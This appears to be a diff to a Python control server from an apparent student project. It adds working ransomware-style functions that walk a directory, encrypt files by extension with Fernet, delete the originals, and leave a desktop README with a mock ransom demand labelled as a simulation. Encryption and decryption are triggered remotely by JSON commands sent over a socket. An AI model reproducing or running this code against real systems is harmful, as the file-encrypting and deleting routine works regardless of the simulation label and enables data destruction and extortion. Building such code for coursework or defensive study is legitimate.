@@ -3,9 +3,10 @@ import threading
 import json
 import logging
 from colorama import init, Fore, Style
-import base64
 import os
 import subprocess
+
+from cryptography.fernet import Fernet
 
 init(autoreset=True)
 
@@ -21,48 +22,91 @@ class ControlServer:
         logging.basicConfig(filename=log_file, level=logging.INFO,
                             format='%(asctime)s - %(levelname)s - %(message)s')
 
+    def encrypt_file(self, key, file_path):
+        fernet = Fernet(key)
+        with open(file_path, 'rb') as file:
+            original = file.read()
+        encrypted = fernet.encrypt(original)
+
+        encrypted_file_path = file_path + ".is613-G6"
+        with open(encrypted_file_path, 'wb') as encrypted_file:
+            encrypted_file.write(encrypted)
+
+        os.remove(file_path)
+        return encrypted_file_path
+
+    def decrypt_file(self, key, file_path):
+        fernet = Fernet(key)
+        with open(file_path, 'rb') as file:
+            encrypted_data = file.read()
+        decrypted_data = fernet.decrypt(encrypted_data)
+
+        original_file_path = file_path.replace(".is613-G6", "")
+        with open(original_file_path, 'wb') as file:
+            file.write(decrypted_data)
+
+        os.remove(file_path)
+
+    def find_and_encrypt_files(self, key, directory, file_extensions):
+        encrypted_files = []
+        for root, _, files in os.walk(directory):
+            for file in files:
+                if any(file.endswith(ext) for ext in file_extensions):
+                    file_path = os.path.join(root, file)
+                    encrypted_file_path = self.encrypt_file(key, file_path)
+                    encrypted_files.append(encrypted_file_path)
+                    print(f"Encrypted and saved file: {encrypted_file_path}")
+        return encrypted_files
+
+    def find_and_decrypt_files(self, key, directory):
+        for root, _, files in os.walk(directory):
+            for file in files:
+                if file.endswith(".is613-G6"):
+                    file_path = os.path.join(root, file)
+                    self.decrypt_file(key, file_path)
+
+    def create_readme(self):
+        desktop_path = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop')
+        readme_path = os.path.join(desktop_path, 'README.txt')
+        with open(readme_path, 'w') as file:
+            file.write("""
+!!!!!!!!!! Alert: Simulation Notice !!!!!!!!!! 
+
+This is a simulation.
+Your file has been encrypted.
+Do not PayNow $888 to 88888888.
+Reminder: Always back up your files, activate firewall and stay vigilant against cyber threats.
+            """)
+
     def handle_client(self, connection, address):
-        buffer = b""  # Initialize an empty byte string for the buffer
-        while True:
-            data = connection.recv(1024)
-            if not data:
-                # No more data is being sent, break the loop
-                break
-            buffer += data
+        data = connection.recv(1024)
+        if not data:
+            print(f'No data received from {address}')
 
         try:
-            message = json.loads(buffer.decode())
-            if 'request' in message and message['request'] == 'key':
-                print(f"Key request received from: {address}")
-                key = input(f"{Fore.RED}Please enter the encryption key: {Style.RESET_ALL}")
-                response = json.dumps({'key': key})
-                connection.sendall(response.encode())
-                logging.info(key)
-            else:
-                logging.info(f"Data received from {address}: {message}")
-                print(f"{Fore.GREEN}Data received: {address}. {message}{Style.RESET_ALL}")
+            message = json.loads(data.decode())
+            logging.info(f"Data received from {address}: {message}")
+            print(f"{Fore.GREEN}Data received: {address}. {message}{Style.RESET_ALL}")
 
-            match message['cmd']:
-                case 'bg':
-                    print(f"Background change request received from {address}")
-                    image_path = "hacked.jpg"
+            response = ''
 
-                    # Command to change the desktop background
-                    # doesn't work
-                    try:
-                        subprocess.run(["xfconf-query", "-c", "xfce4-desktop", "-p",
-                                        "/backdrop/screen0/monitorVirtual-1/workspace0/last-image", "-s", image_path],
-                                       check=True)
-                        print('result:Background changed successfully.')
-                    except subprocess.CalledProcessError as e:
-                        response = json.dumps({'error': 'Failed to change background.'})
-                case 'encrypt':
-                    print (f"Encrypt selected directory")
-                    # TODO copy from encoder.py
-                case 'decrypt':
-                    print (f"decrypt selected directory")
-                    # TODO copy from Decoder.py
+            key = message['key']
+            target_directory = message['target_directory']
+            file_extensions = message['file_extensions']
+            cmd = message['cmd']
+            if cmd == 'enc':
+                self.find_and_encrypt_files(key, target_directory, file_extensions)
+                self.create_readme()
+                response = f'Directory "{target_directory}" is encrypted using key {key} for following file extensions: {file_extensions}.'
+                print(response)
+                logging.info(response)
+            elif cmd == 'dec':
+                self.find_and_decrypt_files(key, target_directory)
+                response = f'Directory "{target_directory}" is decrypted using key {key}.'
+                print(response)
+                logging.info(response)
 
+            connection.sendall(response.encode())
         except json.JSONDecodeError:
             logging.error("Invalid JSON data received.")
         finally:
